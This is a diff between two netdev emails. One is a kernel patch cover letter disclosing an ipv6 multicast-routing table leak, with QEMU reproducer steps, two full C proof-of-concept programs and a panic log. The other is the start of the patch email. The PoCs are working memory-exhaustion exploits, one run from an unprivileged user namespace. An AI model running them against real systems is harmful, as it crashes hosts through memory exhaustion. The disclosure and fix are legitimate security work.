@@ -1,60 +1,62 @@
-Received: from mail-pg1-f180.google.com (mail-pg1-f180.google.com [209.85.215.180])
+Received: from mail-pf1-f178.google.com (mail-pf1-f178.google.com [209.85.210.178])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DC4B7348465
-	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:38:36 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.180
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 71F5D36B919
+	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:38:44 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.178
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1784828318; cv=none; b=cC6eDoBKmec5PORrNZsFSDKBRAPH0LMZcxkUZJuRqCGuivXWWw9v/vbg80cwlLqZR+ELYj5CYaupq8T+bjZwn53AAIl/0aVv77EjPTH+XhNSiOWksiyPKu/win8H1l9WgpM5IVGHVH3v40yU+Zm8abD20TyDPQccg018+spR1VI=
+	t=1784828326; cv=none; b=AYXdFQGPdlxV7pIfenOwYaIRVaI1KlzpFzPNFeczIc96dzuX6T4LSTS4VMvzunX4dHmrfwLbBZkj5EB/tqdap6+L62OjsvH9ehHpLkuQM/YMMF+FTMNEqgh8wRUUUaCg4piSY0ud+lAd6JMSKOxoq0p5sN9JFqXn7iEZDGtpxg8=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1784828318; c=relaxed/simple;
-	bh=Ra65sourFN24bdVK5FVlJDpkkLqkUAydas7G+NpwxuE=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=DHSm8MMxlKDIyUgjgD9zQxrLScMBhOA3GS577emSuS+YoPPu/PQcIqTfGwTtoR0vpNXY0vzVKAsoFQQnP2U2J4qfPOQTWimalLB87FnJmGv7mSNhYdrg0zntkVSivWM7roNtvCSR0b8tesh+pr9Dex3pLeBSU3iVum8AJdHcb/M=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=IACXFhog; arc=none smtp.client-ip=209.85.215.180
+	s=arc-20240116; t=1784828326; c=relaxed/simple;
+	bh=dHpZ+xme3JJSwKh/Yg8/VRHcqL3GmOxUAL3ZmLf2Qpc=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=YFT3S2otNnBi6Gr+GEAw6O15N9esdKYMVHRKechYAm0tw34vS9AsdoXL3v67fplJs/Lze0URlD+1d1J9EWROts2Z76IxxKJGdfClgWn3stke+0WXoWrz2ndxLaidim44vwkN/SO2+x8gf+aziSabnGk08rxOwBvwTnf2baz5u5g=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=iMeS+x9s; arc=none smtp.client-ip=209.85.210.178
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="IACXFhog"
-Received: by mail-pg1-f180.google.com with SMTP id 41be03b00d2f7-ca766c1c9ccso641328a12.0
-        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 10:38:36 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="iMeS+x9s"
+Received: by mail-pf1-f178.google.com with SMTP id d2e1a72fcca58-8485b358552so977045b3a.2
+        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 10:38:44 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1784828316; x=1785433116; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=SlH2y6Qkm5eusgAks1NwkC+mDFGK5kpxxiZRUEVxAqY=;
-        b=IACXFhogW1whi3fttffi+WFkbvBtjuz+gjV27a3+Vn62Y9M+Yl9Qx3vXGrNAL99aZS
-         5IF44Am/++NLuNLlvgMTAUM9zDsOiuTVPeZi7FtqHuk4mbfrIaFfI+sucPP0cB9fjayT
-         Sex+xOeEZYc5FU8xkkVQ+lLV1cPI9zw9f2pO2vwD7Gq1vNDC5Vphzxo9IPCYqJaaMY/3
-         MmL9redAJMf6gptWQFYj35UDfYhpZfIzdQPX0KVmRwQziGgBi1HSWUz/DY5rIiucTuYd
-         fGnB4YNm+q3wLxFDMRAlq6Jjvvq0xltamNRCQZLV16vccinwbutyqiMmepbu7dMo861v
-         i2bg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1784828316; x=1785433116;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=gmail.com; s=20251104; t=1784828324; x=1785433124; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=SlH2y6Qkm5eusgAks1NwkC+mDFGK5kpxxiZRUEVxAqY=;
-        b=p5mFyugdjDb0P9pth9jWrXoIH5ChLQMABTwv9KJ+lcoNQm5E65S0P8ttqJkG8Vjw3I
-         8rk1ILN8i8UeGIbutSktdwDRG2D2jFXlijeEgVZDQemu8K57PSr8xgftwG/cXY4jwS5H
-         eezTxwvQJ4ztlrD0pdU+m0JEuPwcISmydzDBNMyBw1bx4osEgP0F6Svm2Tygxw+wbm/U
-         RXEtdpO+tlsBZ0o9fH8nCccJwWwbyFcWxuaV5uOP+B5wlxUpkyWOGZR6BAN1BftJRWJg
-         ZsXYdYZvaCcKtAQWTICuDN7ppK7Vh8qfJIpmX/DZTcsdZOi+hobquI14ndV4WWR/skgb
-         UNMw==
-X-Gm-Message-State: AOJu0YwV4hBxSDaioH5Zd+nxifSoObyopklBQ+r9M6QA3ZjfYHNamOkn
-	nGef1GnMHobljRW7Ij9vUc2Av1K4po7S+P9Mx/+GWRsylqEZiomGD/WOv5pkVPguBVA=
-X-Gm-Gg: AR+sD109EGijmQon7QtstGRwBgZool/aG0HNidJYk0xyNAk4GC1yeaSD7Xo9kpRQe5d
-	bMgVelfcMUxhT7XxeGEfa/rgN5ODHVwJrKzFBfJ8easMz7zWwyLNah7fnr8cPbO1rMxW8M6TWOf
-	8Y0i+P5w3Uk8mHuwKcMA4nudLLurDtyLC6XfvaDrX3XJW/40hnFnoihYKfd+2EZsqHHRZ0Bk+sU
-	43Z2dNBXUYoz6p9mtckQsP0RNV4GjKnfMghFsw2BiW3psUdXgUBhDpv2i2G0nS2EwkKplQKzB1F
-	ATR9HlRnatQmoc2nBd7uZgWdM7ZE0SnjDmf0iv04hwAtk1OW9OvVzjsmhuAjpOuRW4MeT73ZQwj
-	Nls6HwksB96oB401zCGU7msj2U8g8W1+SrCPVmwX+6dFAnOc0XJGbmT/aDBD4XcWRF0T6lZe9Rd
-	y0i0ufBjwrniJWCWnqZ7A=
-X-Received: by 2002:a05:6a00:218f:b0:847:8449:2bb6 with SMTP id d2e1a72fcca58-84e2b7e3fefmr4884434b3a.4.1784828316049;
-        Thu, 23 Jul 2026 10:38:36 -0700 (PDT)
+        bh=IuORaTSfX7o3lTc/yqWHMjKSOqYRYljtATPuUNCZ4VY=;
+        b=iMeS+x9snkpd4JvThJJEpI+tr7GMh4v0XghXq2M+Pnc6Cf7ohxwJxa6U0oWGMjq+nB
+         vvBwKSH0q7JVKmc5b1xbowrwBYqqkPigXOXvFM5bRt6mmvxzrD/rKvkk3WgUMwgCZ0wO
+         0CylzXF3Ak/krh/Ziy+/V8YcgqkJapuw30bTCmsyxiZptsoB1BdIrNYtSgph7Wl3K28q
+         0RcZFUeeAdd9NfTjloGBCyKq0qRtwmfnNn0zuDN6PJQCzzkdoeZ964MYxg8CRibU+GS2
+         Nppu5Zx6sQs9S//IpTEA7zXlZQ4r1N2U09w+eeerAndadILCmzn0qhh5e62bS6FUXlwT
+         u8aw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1784828324; x=1785433124;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=IuORaTSfX7o3lTc/yqWHMjKSOqYRYljtATPuUNCZ4VY=;
+        b=a/bwaTsiBCTw8zw4WjvFw0lzZk5XT/fYZL60dgyuyesIIMZzEJvMcd2pxrY10dugaH
+         x5y2C0lNTskS9AuH4S7DJ3LSkUunmdIz/kHdlFerDRDIG00f/qWPhEUWFdi625u3yjDv
+         kTBfdqJbno2x9nQTbnsidmpbvpfxTQA8G4E9+xwk9bAliVCo6mhcGxWrRwAHVd/vG54w
+         5Owdxw8wNuH89gSIVpkc82eh9Lu1K67tUHkr9+LJ/NZG8mzpo/7Iyln/Ms9SNmR7rZOw
+         QOdQtxFLrpyEwyoluqJPKwnCuFWAcJL8aqmGtoYxaxUzFwx8gJRI5ML0sh6KyfCTvUHp
+         d4DA==
+X-Gm-Message-State: AOJu0YzTLCvZMXC/Si3A8YUTc1V8o/5VgY++hUkFGAkgJ+LE0sarGL31
+	bQPNYuCpONFjoHyZuohL9YRYr2UBNddELVv0Vy9rjZE2KPryYdv66y2QttVwPuQJ5KI=
+X-Gm-Gg: AR+sD11EeAdggrcrGIjOq/vaMSAq1n2nWiYBtlc7kiT4TUNNT0Mni28HlFhNyP+n3b0
+	AobneTCMNRviUwx2IjeINUK7jA3V8PJTPiGUdx3r4eaTjPtK9h2LtMDlh5pnAbfi78PDmyrnAGp
+	+mE+9sB1mR0D9HGRl+HIZQBkLaXk1V8LEHPxNpthKrHn3iRXFTAAFTfWNOjk9UDPtcszO1ll8jI
+	5uA2QzWwhSS+5l4iFnoqhGGkrWRRO4y5OtEwujfuMbyy8coCFweTQfMmk1m3bd0JHX74f7roSl8
+	9vqcg1Sa7YExujit+PEIDt+kcXewUizIrQDev980pKQu3rLb1mwycI+atSzq0aEcrG5E03Uf8H9
+	02GcANmXF1wU1qetDMBwMLS+gtYiKh9L2kRoJqEK6S7t6qZ2s1/kgdqk4K0ks5KFqEfZT6ljYuU
+	uwIOJXmfN8ETnv8TyvXOU=
+X-Received: by 2002:a05:6a00:1a88:b0:845:3fea:96c with SMTP id d2e1a72fcca58-84e2bc5d1f1mr4635415b3a.21.1784828323534;
+        Thu, 23 Jul 2026 10:38:43 -0700 (PDT)
 Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
-        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e175f1e8dsm3488867b3a.55.2026.07.23.10.38.27
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e175f1e8dsm3488867b3a.55.2026.07.23.10.38.36
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 23 Jul 2026 10:38:35 -0700 (PDT)
+        Thu, 23 Jul 2026 10:38:43 -0700 (PDT)
 From: Ren Wei <enjou1224z@gmail.com>
 To: netdev@vger.kernel.org
 Cc: dsahern@kernel.org,
@@ -67,406 +69,899 @@ Cc: dsahern@kernel.org,
 	vega@nebusec.ai,
 	zihanx@nebusec.ai,
 	enjou1224z@gmail.com
-Subject: [PATCH net 0/1] ipv6: ip6mr: fix mr_table lifetime leak
-Date: Fri, 24 Jul 2026 01:38:22 +0800
-Message-ID: <cover.1784795838.git.zihanx@nebusec.ai>
+Subject: [PATCH net 1/1] ipv6: ip6mr: fix mr_table lifetime leak
+Date: Fri, 24 Jul 2026 01:38:23 +0800
+Message-ID: <70026e78a5cafae9d3ccc560e2b5c4dd47f0a7b0.1784795838.git.zihanx@nebusec.ai>
 X-Mailer: git-send-email 2.51.0
+In-Reply-To: <cover.1784795838.git.zihanx@nebusec.ai>
+References: <cover.1784795838.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
 
-From: Zihan Xi <zihanx@nebusec.ai>=0D
+From: Zihan Xi <zihanx@nebusec.ai>
 
-Hi Linux kernel maintainers,=0D
-=0D
-We found and validated a table lifetime leak in net/ipv6/ip6mr.c. The=0D
-bug is reachable through IPPROTO_IPV6 multicast-routing setsockopt=0D
-operations on a raw ICMPv6 socket by a task that has CAP_NET_ADMIN and=0D
-CAP_NET_RAW in the target netns, including a process that first enters=0D
-a fresh user+net namespace with unshare -Urn. We tested the fix on=0D
-Linux 7.2-rc4, including the legacy MRT6_TABLE loop plus INIT/close=0D
-and INIT/DONE teardown paths, and it should not affect other multicast=0D
-routing functionality. The decoded crash log below is the preserved=0D
-unfixed reference panic from an earlier 7.1.0-rc1 run.=0D
-=0D
-This series contains one patch:=0D
-  1/1 ipv6: ip6mr: fix mr_table lifetime leak=0D
-=0D
-We provide bug details, reproducer steps, and a crash log below.=0D
-=0D
----- details below ----=0D
-=0D
-Bug details:=0D
-=0D
-MRT6_TABLE should only select a multicast routing table, but a fresh=0D
-non-default mr_table could still outlive the socket once MRT6_INIT=0D
-published it. After MRT6_DONE or socket close, ip6mr_sk_done() cleared=0D
-the routing state but left an empty table linked from mr6_tables, so=0D
-repeated MRT6_TABLE(fresh id) -> MRT6_INIT -> MRT6_DONE/close cycles=0D
-accumulated detached tables until netns teardown and eventually=0D
-exhausted memory.=0D
-=0D
-A safe fix needs to account for RCU readers in lookup, getsockopt,=0D
-ioctl, and multicast data paths. This series keeps MRT6_TABLE as a=0D
-pure selector, adds refcounted lifetime pins for runtime users and=0D
-socket ownership, removes empty non-default tables from the published=0D
-set with list_del_rcu() during teardown, and defers the final free to=0D
-process context when the last reference drops outside RTNL. The common=0D
-mr_table allocator also holds a netns reference until final table=0D
-destruction.=0D
-=0D
-Reproducer:=0D
-=0D
-    host$ qemu-img create -f qcow2 -F raw \=0D
-      -b /mnt/d/WSL/prepare-package/kernel-image/bullseye.img \=0D
-      /tmp/ip6mr-master-verify-overlay.qcow2=0D
-    host$ qemu-system-x86_64 -m 2G -cpu host -smp 2 \=0D
-      -machine accel=3Dkvm \=0D
-      -kernel /var/cache/linux-patch/ip6mr-master-build/arch/x86/boot/bzIma=
-ge \=0D
-      -append 'root=3D/dev/sda rw console=3DttyS0 earlyprintk=3Dserial \=0D
-      net.ifnames=3D0 biosdevname=3D0 panic_on_warn=3D1 oops=3Dpanic \=0D
-      slub_debug=3DFZPU page_poison=3D1 init_on_alloc=3D1 init_on_free=3D1'=
- \=0D
-      -drive file=3D/tmp/ip6mr-master-verify-overlay.qcow2,format=3Dqcow2 \=
-=0D
-      -nographic -netdev user,id=3Dnet0,hostfwd=3Dtcp::19023-:22 \=0D
-      -device virtio-net-pci,netdev=3Dnet0=0D
-    host$ scp -P 19023 poc.static verify-clean/poc-initdone.static \=0D
-      root@localhost:/tmp/=0D
-    guest# /tmp/poc.static 30000 1=0D
-    guest# /tmp/poc-initdone.static 10000 500000 close=0D
-    guest# /tmp/poc-initdone.static 10000 600000 done=0D
-    guest# su - test_user -c \=0D
-      'unshare -Urn sh -c "/tmp/poc-initdone.static \=0D
-      10000 700000 done"'=0D
-=0D
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.=0D
-=0D
-The main INIT/close and INIT/DONE reproducer is shown first. The=0D
-legacy MRT6_TABLE-only helper used for the secondary check follows.=0D
-=0D
-------BEGIN poc-initdone.c------=0D
-=0D
-#define _GNU_SOURCE=0D
-#include <errno.h>=0D
-#include <linux/mroute6.h>=0D
-#include <netinet/icmp6.h>=0D
-#include <stdio.h>=0D
-#include <stdlib.h>=0D
-#include <string.h>=0D
-#include <sys/resource.h>=0D
-#include <sys/socket.h>=0D
-#include <sys/types.h>=0D
-#include <unistd.h>=0D
-=0D
-static void usage(const char *prog)=0D
-{=0D
-	fprintf(stderr,=0D
-		"Usage: %s [count] [start_table] [mode]\n"=0D
-		"  count: number of sockets/tables to create (default: 20000)\n"=0D
-		"  start_table: first table id to use (default: 1)\n"=0D
-		"  mode: close | done (default: close)\n",=0D
-		prog);=0D
-	exit(1);=0D
-}=0D
-=0D
-static int do_one(unsigned int table, int do_done)=0D
-{=0D
-	int fd;=0D
-	int one =3D 1;=0D
-=0D
-	fd =3D socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);=0D
-	if (fd < 0) {=0D
-		fprintf(stderr, "socket failed for table %u: %s\n", table,=0D
-			strerror(errno));=0D
-		return -1;=0D
-	}=0D
-=0D
-	if (setsockopt(fd, IPPROTO_IPV6, MRT6_TABLE, &table, sizeof(table)) < 0) {=
-=0D
-		fprintf(stderr, "MRT6_TABLE(%u) failed: %s\n", table,=0D
-			strerror(errno));=0D
-		close(fd);=0D
-		return -1;=0D
-	}=0D
-=0D
-	if (setsockopt(fd, IPPROTO_IPV6, MRT6_INIT, &one, sizeof(one)) < 0) {=0D
-		fprintf(stderr, "MRT6_INIT(%u) failed: %s\n", table,=0D
-			strerror(errno));=0D
-		close(fd);=0D
-		return -1;=0D
-	}=0D
-=0D
-	if (do_done && setsockopt(fd, IPPROTO_IPV6, MRT6_DONE, &one, sizeof(one)) =
-< 0) {=0D
-		fprintf(stderr, "MRT6_DONE(%u) failed: %s\n", table,=0D
-			strerror(errno));=0D
-		close(fd);=0D
-		return -1;=0D
-	}=0D
-=0D
-	if (close(fd) < 0) {=0D
-		fprintf(stderr, "close(%u) failed: %s\n", table, strerror(errno));=0D
-		return -1;=0D
-	}=0D
-=0D
-	return 0;=0D
-}=0D
-=0D
-int main(int argc, char **argv)=0D
-{=0D
-	unsigned int count =3D 20000;=0D
-	unsigned int start =3D 1;=0D
-	unsigned int i;=0D
-	int do_done =3D 0;=0D
-=0D
-	if (argc > 4)=0D
-		usage(argv[0]);=0D
-	if (argc >=3D 2)=0D
-		count =3D strtoul(argv[1], NULL, 0);=0D
-	if (argc >=3D 3)=0D
-		start =3D strtoul(argv[2], NULL, 0);=0D
-	if (argc =3D=3D 4) {=0D
-		if (!strcmp(argv[3], "done"))=0D
-			do_done =3D 1;=0D
-		else if (strcmp(argv[3], "close"))=0D
-			usage(argv[0]);=0D
-	}=0D
-=0D
-	if (!count || !start || start >=3D 100000000U)=0D
-		usage(argv[0]);=0D
-=0D
-	for (i =3D 0; i < count; i++) {=0D
-		u_int32_t table =3D start + i;=0D
-=0D
-		if (table >=3D 100000000U) {=0D
-			fprintf(stderr, "stopped before invalid table id %u\n", table);=0D
-			break;=0D
-		}=0D
-=0D
-		if (do_one(table, do_done) < 0)=0D
-			return 2;=0D
-=0D
-		if ((i % 1000) =3D=3D 0) {=0D
-			struct rusage ru;=0D
-=0D
-			if (!getrusage(RUSAGE_SELF, &ru))=0D
-				fprintf(stderr,=0D
-					"completed=3D%u current_table=3D%u maxrss_kb=3D%ld mode=3D%s\n",=0D
-					i + 1, table, ru.ru_maxrss,=0D
-					do_done ? "done" : "close");=0D
-			else=0D
-				fprintf(stderr,=0D
-					"completed=3D%u current_table=3D%u mode=3D%s\n",=0D
-					i + 1, table, do_done ? "done" : "close");=0D
-		}=0D
-	}=0D
-=0D
-	fprintf(stderr,=0D
-		"done: completed %u init/%s cycles starting at table %u\n",=0D
-		i, do_done ? "done" : "close", start);=0D
-	sleep(2);=0D
-	return 0;=0D
-}=0D
-=0D
-------END poc-initdone.c--------=0D
-=0D
-------BEGIN poc.c------=0D
-=0D
-#define _GNU_SOURCE=0D
-#include <arpa/inet.h>=0D
-#include <errno.h>=0D
-#include <linux/mroute6.h>=0D
-#include <netinet/icmp6.h>=0D
-#include <netinet/in.h>=0D
-#include <stdio.h>=0D
-#include <stdlib.h>=0D
-#include <string.h>=0D
-#include <sys/resource.h>=0D
-#include <sys/socket.h>=0D
-#include <sys/types.h>=0D
-#include <unistd.h>=0D
-=0D
-static void die(const char *msg)=0D
-{=0D
-	perror(msg);=0D
-	exit(1);=0D
-}=0D
-=0D
-static void usage(const char *prog)=0D
-{=0D
-	fprintf(stderr,=0D
-		"Usage: %s [count] [start_table]\n"=0D
-		"  count: number of new MRT6 table ids to allocate (default: 200000)\n"=0D
-		"  start_table: first table id to use (default: 1)\n",=0D
-		prog);=0D
-	exit(1);=0D
-}=0D
-=0D
-int main(int argc, char **argv)=0D
-{=0D
-	unsigned int count =3D 200000;=0D
-	unsigned int start =3D 1;=0D
-	unsigned int i;=0D
-	int fd;=0D
-=0D
-	if (argc > 3)=0D
-		usage(argv[0]);=0D
-	if (argc >=3D 2)=0D
-		count =3D strtoul(argv[1], NULL, 0);=0D
-	if (argc =3D=3D 3)=0D
-		start =3D strtoul(argv[2], NULL, 0);=0D
-=0D
-	if (count =3D=3D 0 || start =3D=3D 0 || start >=3D 100000000U)=0D
-		usage(argv[0]);=0D
-=0D
-	fd =3D socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);=0D
-	if (fd < 0)=0D
-		die("socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)");=0D
-=0D
-	for (i =3D 0; i < count; i++) {=0D
-		u_int32_t table =3D start + i;=0D
-=0D
-		if (table >=3D 100000000U) {=0D
-			fprintf(stderr, "stopped before invalid table id %u\n", table);=0D
-			break;=0D
-		}=0D
-=0D
-		if (setsockopt(fd, IPPROTO_IPV6, MRT6_TABLE, &table,=0D
-			       sizeof(table)) < 0) {=0D
-			fprintf(stderr,=0D
-				"setsockopt(MRT6_TABLE, %u) failed after %u allocations: %s\n",=0D
-				table, i, strerror(errno));=0D
-			close(fd);=0D
-			return 2;=0D
-		}=0D
-=0D
-		if ((i % 10000) =3D=3D 0) {=0D
-			struct rusage ru;=0D
-=0D
-			if (!getrusage(RUSAGE_SELF, &ru))=0D
-				fprintf(stderr,=0D
-					"allocated=3D%u current_table=3D%u maxrss_kb=3D%ld\n",=0D
-					i + 1, table, ru.ru_maxrss);=0D
-			else=0D
-				fprintf(stderr, "allocated=3D%u current_table=3D%u\n",=0D
-					i + 1, table);=0D
-		}=0D
-	}=0D
-=0D
-		fprintf(stderr,=0D
-			"done: allocated %u tables on one socket without MRT6_INIT; closing sock=
-et now\n",=0D
-			i);=0D
-	close(fd);=0D
-	sleep(2);=0D
-fprintf(stderr, "socket closed; tables persist until netns teardown\n");=0D
-return 0;=0D
-}=0D
-=0D
-------END poc.c--------=0D
-=0D
-The decoded crash log below is the preserved unfixed reference panic=0D
-from the earlier 7.1.0-rc1 run.=0D
-=0D
-----BEGIN crash log----=0D
-[ 1443.893330][    T1] Kernel panic - not syncing: System is deadlocked on =
-memory=0D
-[ 1443.893927][    T1] CPU: 3 UID: 0 PID: 1 Comm: systemd Not tainted 7.1.0=
--rc1 #2 PREEMPT(full)=0D
-[ 1443.894503][    T1] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, =
-1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
-[ 1443.895175][    T1] Call Trace:=0D
-[ 1443.895398][    T1]  <TASK>=0D
-[ 1443.895601][ T1] vpanic+0x6c3/0x790 =0D
-[ 1443.895879][ T1] ? __pfx_vpanic+0x10/0x10 =0D
-[ 1443.896186][ T1] panic+0xca/0xd0 =0D
-[ 1443.896433][ T1] ? __pfx_panic+0x10/0x10 =0D
-[ 1443.896749][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.897134][ T1] out_of_memory+0x1400/0x1430 =0D
-[ 1443.897461][ T1] ? __pfx_out_of_memory+0x10/0x10 =0D
-[ 1443.897813][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.898196][ T1] __alloc_frozen_pages_noprof+0x2306/0x2af0 =0D
-[ 1443.898613][ T1] ? __pfx_blk_mq_flush_plug_list+0x10/0x10 =0D
-[ 1443.899002][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.899373][ T1] ? ext4_mpage_readpages+0x577/0x14d0 =0D
-[ 1443.899733][ T1] ? __pfx___alloc_frozen_pages_noprof+0x10/0x10 =0D
-[ 1443.900180][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.900543][ T1] ? __blk_flush_plug+0x27d/0x4e0 =0D
-[ 1443.900912][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.901277][ T1] ? blk_finish_plug+0x52/0xa0 =0D
-[ 1443.901605][ T1] alloc_pages_mpol+0x14a/0x440 =0D
-[ 1443.901919][ T1] ? __pfx_alloc_pages_mpol+0x10/0x10 =0D
-[ 1443.902263][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.902643][ T1] folio_alloc_noprof+0x16/0x1a0 =0D
-[ 1443.902965][ T1] filemap_alloc_folio_noprof.part.0+0x285/0x350 =0D
-[ 1443.903371][ T1] ? __pfx_filemap_alloc_folio_noprof.part.0+0x10/0x10 =0D
-[ 1443.903813][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.904177][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.904560][ T1] __filemap_get_folio_mpol+0x3e2/0x880 =0D
-[ 1443.904934][ T1] filemap_fault+0x12c6/0x2370 =0D
-[ 1443.905251][ T1] ? __pfx_filemap_fault+0x10/0x10 =0D
-[ 1443.905634][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.905996][ T1] ? find_held_lock+0x2b/0x80 =0D
-[ 1443.906296][ T1] ? __pfx_filemap_map_pages+0x10/0x10 =0D
-[ 1443.906672][ T1] __do_fault+0xf0/0x310 =0D
-[ 1443.906952][ T1] do_fault+0x873/0x1230 =0D
-[ 1443.907243][ T1] __handle_mm_fault+0x1186/0x1f90 =0D
-[ 1443.907595][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.907980][ T1] ? reacquire_held_locks+0xcd/0x1f0 =0D
-[ 1443.908329][ T1] ? __pfx___handle_mm_fault+0x10/0x10 =0D
-[ 1443.908714][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.909081][ T1] ? lock_vma_under_rcu+0x12b/0x3f0 =0D
-[ 1443.909439][ T1] ? __pfx_lock_vma_under_rcu+0x10/0x10 =0D
-[ 1443.909822][ T1] handle_mm_fault+0x2ad/0x8c0 =0D
-[ 1443.910138][ T1] ? rcu_is_watching+0x12/0xc0 =0D
-[ 1443.910444][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
-[ 1443.910815][ T1] do_user_addr_fault+0x302/0xdd0 =0D
-[ 1443.911147][ T1] ? trace_page_fault_user+0x133/0x180 =0D
-[ 1443.911514][ T1] exc_page_fault+0x64/0xd0 =0D
-[ 1443.911812][ T1] asm_exc_page_fault+0x26/0x30 =0D
-[ 1443.912130][    T1] RIP: 0033:0x7f4be5e464d4=0D
-[ 1443.912422][ T1] Code: Unable to access opcode bytes at 0x7f4be5e464aa.=
-=0D
-=0D
-Code starting with the faulting instruction=0D
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=0D
-[ 1443.912875][    T1] RSP: 002b:00007ffec58b8a60 EFLAGS: 00010286=0D
-[ 1443.913276][    T1] RAX: 0000000000000000 RBX: 0000000000000002 RCX: 000=
-0000000000000=0D
-[ 1443.913785][    T1] RDX: 00007f4be5f96000 RSI: ffffffffffffffff RDI: 000=
-07f4be6375a73=0D
-[ 1443.914285][    T1] RBP: 00007f4be6375a71 R08: 000055b690575010 R09: 000=
-055b690587810=0D
-[ 1443.914805][    T1] R10: 00007f4be5f198b6 R11: 0000000000000057 R12: fff=
-fffffffffffff=0D
-[ 1443.915306][    T1] R13: 000055b690575010 R14: 0000000000000000 R15: 000=
-0000000000073=0D
-[ 1443.915839][    T1]  </TASK>=0D
-[ 1443.916485][    T1] Kernel Offset: disabled=0D
-[ 1443.916802][    T1] Rebooting in 86400 seconds..=0D
-=0D
------END crash log-----=0D
-=0D
-Best regards,=0D
-Zihan Xi=0D
-=0D
-Zihan Xi (1):=0D
-  ipv6: ip6mr: fix mr_table lifetime leak=0D
-=0D
- include/linux/mroute_base.h |   6 +=0D
- net/ipv4/ipmr_base.c        |   6 +-=0D
- net/ipv6/ip6mr.c            | 328 +++++++++++++++++++++++++++---------=0D
- 3 files changed, 258 insertions(+), 82 deletions(-)=0D
-=0D
-=0D
-base-commit: 1590cf0329716306e948a8fc29f1d3ee87d3989f=0D
--- =0D
-2.43.0=0D
-=0D
+MRT6_TABLE should only select a multicast routing table, but a fresh
+non-default mr_table can still outlive the socket once MRT6_INIT
